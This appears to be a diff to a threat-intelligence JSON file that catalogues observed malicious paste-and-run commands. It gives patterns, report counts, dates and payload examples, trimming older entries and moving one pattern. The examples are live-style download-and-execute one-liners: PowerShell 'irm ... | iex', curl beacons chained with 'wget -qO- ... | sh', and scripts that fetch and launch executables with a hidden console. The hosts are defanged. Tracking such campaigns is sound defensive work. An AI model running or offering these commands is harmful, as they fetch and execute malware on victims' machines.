@@ -1,12 +1,11 @@
 [
   {
     "Pattern": "irm '<URL>'|iex;",
-    "DistinctPayloadCount": 45,
-    "ReportCount": 45,
-    "FirstSeen": "2026-11-21T18:26:04.212000+00:00",
+    "DistinctPayloadCount": 44,
+    "ReportCount": 44,
+    "FirstSeen": "2026-11-22T00:10:10.523000+00:00",
     "LastSeen": "2026-11-26T16:00:18.255000+00:00",
     "ReportIds": [
-      "cmwqqo73r28eh0omli28sjqkd",
       "cmwr2ypwb29gj0omlf48po5rs",
       "cmwr3jq8o2aa40oml2lcavt5m",
       "cmwr4m1rl2b0o0omlqujsc9z5",
@@ -96,8 +95,7 @@
       "irm 'img-codes-cloude[.]info/c5dee301a82e8e70'|iex;",
       "irm 'img-codes-cloude[.]info/e5b08024c3c972ec'|iex;",
       "irm 'img-codes-cloude[.]info/e99c62e4af9ec4fb'|iex;",
-      "irm 'img-codes-cloude[.]info/ea37da5c216f5f5c'|iex;",
-      "irm 'img-codes-cloude[.]info/f4783b5bf31293eb'|iex;"
+      "irm 'img-codes-cloude[.]info/ea37da5c216f5f5c'|iex;"
     ]
   },
   {
@@ -199,15 +197,11 @@
   },
   {
     "Pattern": "curl -sL -d \"id=<UUID>&location=Europe%2FAmsterdam%20%7C%20en-US&siteUrl=<ENCODED_URL>&os=Linux%20x86_64&lastVisitAt=<TIMESTAMP>&lastShellAt=<TIMESTAMP>\" \"<URL>\" && wget -qO- '<URL>' -L | sh",
-    "DistinctPayloadCount": 13,
-    "ReportCount": 13,
-    "FirstSeen": "2026-11-21T18:02:35.559000+00:00",
+    "DistinctPayloadCount": 9,
+    "ReportCount": 9,
+    "FirstSeen": "2026-11-22T06:11:51.571000+00:00",
     "LastSeen": "2026-11-27T14:34:32.668000+00:00",
     "ReportIds": [
-      "cmwqpu06v27ji0omlu559sc5b",
-      "cmwqpwmhz27m00omlp1rpevv5",
-      "cmwqpxhh627mx0omllsgzqfp0",
-      "cmwqq2oao27sk0omlumf8eo41",
       "cmwrfvujw2j350omlr7lq12wu",
       "cmwrg8f572jhm0oml1i1cdbji",
       "cmwrt1qlc2sfd0omlb78iqtog",
@@ -220,29 +214,23 @@
     ],
     "PayloadExamples": [
       "curl -sL -d \"id=15d2bf00-1751-4e33-a4c2-112a1403025c&location=Europe%2FAmsterdam%20%7C%20en-US&siteUrl=https%3A%2F%2Fvote-kng528.aduide.id%2F&os=Linux%20x86_64&lastVisitAt=2026-11-24T16%3A35%3A29.941Z&lastShellAt=2026-11-24T16%3A35%3A29.941Z\" \"https://script[.]google[.]com/macros/s/AKfycbzs0vQRvI-2Bx4VUUCxUA4k64HdkiHicTmuK3y1MXAl7AgjPIWtRBZqH0v6EzzeuBaH/exec\" && wget -qO- 'https://claude-flare-verification[.]vercel[.]app/lin' -L | sh",
-      "curl -sL -d \"id=2d4d68ed-9b81-40d6-976e-c7786c281fef&location=Europe%2FAmsterdam%20%7C%20en-US&siteUrl=https%3A%2F%2Fgrupoporraspyp[.]net%2F&os=Linux%20x86_64&lastVisitAt=2026-11-21T18%3A07%3A57.729Z&lastShellAt=2026-11-21T18%3A07%3A57.729Z\" \"https://script[.]google[.]com/macros/s/AKfycbzs0vQRvI-2Bx4VUUCxUA4k64HdkiHicTmuK3y1MXAl7AgjPIWtRBZqH0v6EzzeuBaH/exec\" && wget -qO- 'https://script-six-tawny[.]vercel[.]app/lin' -L | sh",
       "curl -sL -d \"id=450523a1-8869-470a-a865-c3ecd451a7a4&location=Europe%2FAmsterdam%20%7C%20en-US&siteUrl=https%3A%2F%2Fstaging[.]smilesbydelivery[.]com%2F&os=Linux%20x86_64&lastVisitAt=2026-11-27T14%3A33%3A10.700Z&lastShellAt=2026-11-27T14%3A33%3A10.700Z\" \"https://script[.]google[.]com/macros/s/AKfycbzs0vQRvI-2Bx4VUUCxUA4k64HdkiHicTmuK3y1MXAl7AgjPIWtRBZqH0v6EzzeuBaH/exec\" && wget -qO- 'https://script-six-tawny[.]vercel[.]app/lin' -L | sh",
       "curl -sL -d \"id=475c2e82-40b8-4a03-9bea-e9036c8286df&location=Europe%2FAmsterdam%20%7C%20en-US&siteUrl=https%3A%2F%2Fuktopthesis[.]co[.]uk%2F&os=Linux%20x86_64&lastVisitAt=2026-11-22T12%3A18%3A54.377Z&lastShellAt=2026-11-22T12%3A18%3A54.377Z\" \"https://script[.]google[.]com/macros/s/AKfycbzs0vQRvI-2Bx4VUUCxUA4k64HdkiHicTmuK3y1MXAl7AgjPIWtRBZqH0v6EzzeuBaH/exec\" && wget -qO- 'https://claude-flare-verification[.]vercel[.]app/lin' -L | sh",
-      "curl -sL -d \"id=561e2d47-1a95-4137-80a6-ce6753636aef&location=Europe%2FAmsterdam%20%7C%20en-US&siteUrl=https%3A%2F%2Fnutrinuts.co.ke%2F&os=Linux%20x86_64&lastVisitAt=2026-11-21T18%3A03%3A12.706Z&lastShellAt=2026-11-21T18%3A03%3A12.706Z\" \"https://script[.]google[.]com/macros/s/AKfycbzs0vQRvI-2Bx4VUUCxUA4k64HdkiHicTmuK3y1MXAl7AgjPIWtRBZqH0v6EzzeuBaH/exec\" && wget -qO- 'https://script-six-tawny[.]vercel[.]app/lin' -L | sh",
-      "curl -sL -d \"id=57b4435a-0b39-4db6-9702-81be6db5ccd0&location=Europe%2FAmsterdam%20%7C%20en-US&siteUrl=https%3A%2F%2Fmurdocknaturalhealing[.]com%2F&os=Linux%20x86_64&lastVisitAt=2026-11-21T18%3A03%3A55.811Z&lastShellAt=2026-11-21T18%3A03%3A55.811Z\" \"https://script[.]google[.]com/macros/s/AKfycbzs0vQRvI-2Bx4VUUCxUA4k64HdkiHicTmuK3y1MXAl7AgjPIWtRBZqH0v6EzzeuBaH/exec\" && wget -qO- 'https://claude-flare-verification[.]vercel[.]app/lin' -L | sh",
       "curl -sL -d \"id=828944bd-1f28-4c77-9cbc-9cc3f9894257&location=Europe%2FAmsterdam%20%7C%20en-US&siteUrl=https%3A%2F%2Fjewelsthecelebrant[.]com%2F&os=Linux%20x86_64&lastVisitAt=2026-11-22T06%3A20%3A16.169Z&lastShellAt=2026-11-22T06%3A20%3A16.169Z\" \"https://script[.]google[.]com/macros/s/AKfycbzs0vQRvI-2Bx4VUUCxUA4k64HdkiHicTmuK3y1MXAl7AgjPIWtRBZqH0v6EzzeuBaH/exec\" && wget -qO- 'https://script-six-tawny[.]vercel[.]app/lin' -L | sh",
       "curl -sL -d \"id=86c4c5bc-11cc-4626-9479-c5ca2a574a74&location=Europe%2FAmsterdam%20%7C%20en-US&siteUrl=https%3A%2F%2Fwww[.]khreader[.]epizy[.]com%2F%3Fi%3D1&os=Linux%20x86_64&lastVisitAt=2026-11-24T20%3A37%3A31.873Z&lastShellAt=2026-11-24T20%3A37%3A31.873Z\" \"https://script[.]google[.]com/macros/s/AKfycbzs0vQRvI-2Bx4VUUCxUA4k64HdkiHicTmuK3y1MXAl7AgjPIWtRBZqH0v6EzzeuBaH/exec\" && wget -qO- 'https://claude-flare-verification[.]vercel[.]app/lin' -L | sh",
       "curl -sL -d \"id=a29e020e-8086-463b-8bb6-a7daaf24e3c2&location=Europe%2FAmsterdam%20%7C%20en-US&siteUrl=https%3A%2F%2Falomaglow[.]com%2F&os=Linux%20x86_64&lastVisitAt=2026-11-22T06%3A10%3A29.130Z&lastShellAt=2026-11-22T06%3A10%3A29.130Z\" \"https://script[.]google[.]com/macros/s/AKfycbzs0vQRvI-2Bx4VUUCxUA4k64HdkiHicTmuK3y1MXAl7AgjPIWtRBZqH0v6EzzeuBaH/exec\" && wget -qO- 'https://script-six-tawny[.]vercel[.]app/lin' -L | sh",
       "curl -sL -d \"id=bc759bae-8f26-4220-8046-410284017e55&location=Europe%2FAmsterdam%20%7C%20en-US&siteUrl=https%3A%2F%2Fwww[.]ascent[.]se%2F&os=Linux%20x86_64&lastVisitAt=2026-11-24T19%3A30%3A35.746Z&lastShellAt=2026-11-24T19%3A30%3A35.746Z\" \"https://script[.]google[.]com/macros/s/AKfycbzs0vQRvI-2Bx4VUUCxUA4k64HdkiHicTmuK3y1MXAl7AgjPIWtRBZqH0v6EzzeuBaH/exec\" && wget -qO- 'https://script-six-tawny[.]vercel[.]app/lin' -L | sh",
       "curl -sL -d \"id=c3ce6ff9-62d8-4db8-abc8-456006e2de46&location=Europe%2FAmsterdam%20%7C%20en-US&siteUrl=https%3A%2F%2Fwww[.]isuzucorluservis[.]com%2F&os=Linux%20x86_64&lastVisitAt=2026-11-27T07%3A52%3A28.414Z&lastShellAt=2026-11-27T07%3A52%3A28.414Z\" \"https://script[.]google[.]com/macros/s/AKfycbzs0vQRvI-2Bx4VUUCxUA4k64HdkiHicTmuK3y1MXAl7AgjPIWtRBZqH0v6EzzeuBaH/exec\" && wget -qO- 'https://script-six-tawny[.]vercel[.]app/lin' -L | sh",
-      "curl -sL -d \"id=e0dfcb69-2b9c-4ad4-8e3d-08745ee4c064&location=Europe%2FAmsterdam%20%7C%20en-US&siteUrl=https%3A%2F%2Fvnailsupply[.]com%2F&os=Linux%20x86_64&lastVisitAt=2026-11-21T18%3A01%3A12.726Z&lastShellAt=2026-11-21T18%3A01%3A12.726Z\" \"https://script[.]google[.]com/macros/s/AKfycbzs0vQRvI-2Bx4VUUCxUA4k64HdkiHicTmuK3y1MXAl7AgjPIWtRBZqH0v6EzzeuBaH/exec\" && wget -qO- 'https://claude-flare-verification[.]vercel[.]app/lin' -L | sh",
       "curl -sL -d \"id=e1c59076-c59e-4b80-be1c-b68c84b0ed64&location=Europe%2FAmsterdam%20%7C%20en-US&siteUrl=https%3A%2F%2Fryangarnish[.]com%2F&os=Linux%20x86_64&lastVisitAt=2026-11-22T12%3A24%3A58.015Z&lastShellAt=2026-11-22T12%3A24%3A58.015Z\" \"https://script[.]google[.]com/macros/s/AKfycbzs0vQRvI-2Bx4VUUCxUA4k64HdkiHicTmuK3y1MXAl7AgjPIWtRBZqH0v6EzzeuBaH/exec\" && wget -qO- 'https://script-six-tawny[.]vercel[.]app/lin' -L | sh"
     ]
   },
   {
     "Pattern": "IRM <URL> | IEX",
-    "DistinctPayloadCount": 6,
-    "ReportCount": 33,
-    "FirstSeen": "2026-11-21T18:05:32.725000+00:00",
+    "DistinctPayloadCount": 5,
+    "ReportCount": 31,
+    "FirstSeen": "2026-11-22T04:08:39.055000+00:00",
     "LastSeen": "2026-11-27T14:20:21.191000+00:00",
     "ReportIds": [
-      "cmwqpxsxb27nq0oml2sxi5qsj",
-      "cmwqpyrka27pi0oml5ef1qp1r",
       "cmwrbhefp2hzv0omlbe37fsqt",
       "cmwrd2dg22ir70omlf543udnz",
       "cmwrdyff62irs0omlxjwupgay",
@@ -277,7 +265,6 @@
     ],
     "PayloadExamples": [
       "IRM gitlab[.]com/be1c-3b11c244d2b2/bc99-45b9-a035-f6af7c134dd7/-/raw/main/7F5-4410-9a93-F371ffdFaF84 | IEX",
-      "IRM gitlab[.]com/cc4b6f224188/efad4910-0ec9-439e-aa10-54dca6ba535e/-/raw/main/9869d9ad-7e4a-407a-8829-89c0d60614c7 | IEX",
       "IRM gitlab[.]com/joon1286/1fdbd074-392d-4285-b67e-ff498ddcb29e/-/raw/main/b04f13f7-5981-4267-afc4-1e6152d7b677 | IEX",
       "IRM gitlab[.]com/nova-84e1-18b2b/5500-e4c4-44c7-84d6-987c6ab00aba/-/raw/main/abb8-52e04871081f?ref_type=heads | IEX",
       "IRM gitlab[.]com/pas-quarenmjn/a1b22db-1028-4ff5-8353-9ef7c7fedbbd/-/raw/main/Ba-761bEc36334D | IEX",
@@ -322,23 +309,6 @@
     "PayloadExamples": [
       "(irm 'http://hagosuro[.]lc/dantestraff18/9956ca98593d95f4' -UserAgent 'WUA/bdda1e77b2' -Headers @{'X-WUA'='bdda1e77b2'})|iex",
       "(irm 'https://cosmical2049[.]com/startapv2/f9b9bfb54f8b30ec' -UserAgent 'WUA/b1d0126493' -Headers @{'X-WUA'='b1d0126493'})|iex"
-    ]
-  },
-  {
-    "Pattern": "$p=\"$env:APPDATA\\uni2\\Beautifull.exe\"; New-Item (Split-Path $p) -ItemType Directory -Force | Out-Null; curl.exe -fsL -o \"$p\" \"<URL>\"; if (Test-Path $p) { Start-Process $p }; exit",
-    "DistinctPayloadCount": 2,
-    "ReportCount": 4,
-    "FirstSeen": "2026-11-21T18:08:11.796000+00:00",
-    "LastSeen": "2026-11-27T08:31:16.530000+00:00",
-    "ReportIds": [
-      "cmwqq17ls27rw0oml42clk3bv",
-      "cmwv06sn108z90nmllnm9vbl9",
-      "cmwv0ke1j09ge0nml7qoagfb9",
-      "cmwyq2eaq0i5q0omljvzkejxo"
-    ],
-    "PayloadExamples": [
-      "$p=\"$env:APPDATA\\uni2\\Beautifull.exe\"; New-Item (Split-Path $p) -ItemType Directory -Force | Out-Null; curl.exe -fsL -o \"$p\" \"https://swingerwives[.]com\"; if (Test-Path $p) { Start-Process $p }; exit",
-      "$p=\"$env:APPDATA\\uni2\\Beautifull.exe\"; New-Item (Split-Path $p) -ItemType Directory -Force | Out-Null; curl.exe -fsL -o \"$p\" \"https://woodland-furniture[.]com\"; if (Test-Path $p) { Start-Process $p }; exit"
     ]
   },
   {
@@ -404,12 +374,10 @@
   {
     "Pattern": "$url = \"<URL>\";\n$filename = \"Boost Note.exe\";\n$path = $env:TEMP;\n$archive = Join-Path $path \"TlkVMerN.zip\";\n$filepath = Join-Path $path $filename;\n$signature = @\"\nusing System;\nusing System.Runtime.InteropServices;\npublic class Win32 {\n\t[DllImport(\"kernel32.dll\")]\n\tpublic static extern IntPtr GetConsoleWindow();\n\t[DllImport(\"user32.dll\")]\n\tpublic static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);\n}\n\"@;\nAdd-Type $signature;\n$hwnd = [Win32]::GetConsoleWindow();\nif($hwnd -ne [IntPtr]::Zero)\n{\n\t[Win32]::ShowWindow($hwnd, 0);\n}\nNew-Item -Path $path -ItemType Directory -Force;\ncurl $url -o $archive;\nExpand-Archive -Path $archive -DestinationPath $path -Force;\nRemove-Item $archive -Force;\nStart-Process $filepath;\nexit",
     "DistinctPayloadCount": 1,
-    "ReportCount": 15,
-    "FirstSeen": "2026-11-21T18:07:09.543000+00:00",
+    "ReportCount": 13,
+    "FirstSeen": "2026-11-21T19:21:46.825000+00:00",
     "LastSeen": "2026-11-22T10:45:15.619000+00:00",
     "ReportIds": [
-      "cmwqpzvm527qz0omlbakji56v",
-      "cmwqqaax7281a0omlwpjbmm8f",
       "cmwqsnua328lm0omlqomd3emx",
       "cmwr1ddfx28u30oml4qgsvp8u",
       "cmwr1e0hk28uo0omlsv4p1gom",
@@ -443,6 +411,21 @@
     ],
     "PayloadExamples": [
       "powershell -w h \"iex(irm \\'fingerprint-veri[.]info/d8fc26fb3c8ae49a\\'); Start-Sleep -Seconds 30\"; exit"
+    ]
+  },
+  {
+    "Pattern": "$p=\"$env:APPDATA\\uni2\\Beautifull.exe\"; New-Item (Split-Path $p) -ItemType Directory -Force | Out-Null; curl.exe -fsL -o \"$p\" \"<URL>\"; if (Test-Path $p) { Start-Process $p }; exit",
+    "DistinctPayloadCount": 1,
+    "ReportCount": 3,
+    "FirstSeen": "2026-11-24T18:03:33.186000+00:00",
+    "LastSeen": "2026-11-27T08:31:16.530000+00:00",
+    "ReportIds": [
+      "cmwv06sn108z90nmllnm9vbl9",
+      "cmwv0ke1j09ge0nml7qoagfb9",
+      "cmwyq2eaq0i5q0omljvzkejxo"
+    ],
+    "PayloadExamples": [
+      "$p=\"$env:APPDATA\\uni2\\Beautifull.exe\"; New-Item (Split-Path $p) -ItemType Directory -Force | Out-Null; curl.exe -fsL -o \"$p\" \"https://woodland-furniture[.]com\"; if (Test-Path $p) { Start-Process $p }; exit"
     ]
   },
   {
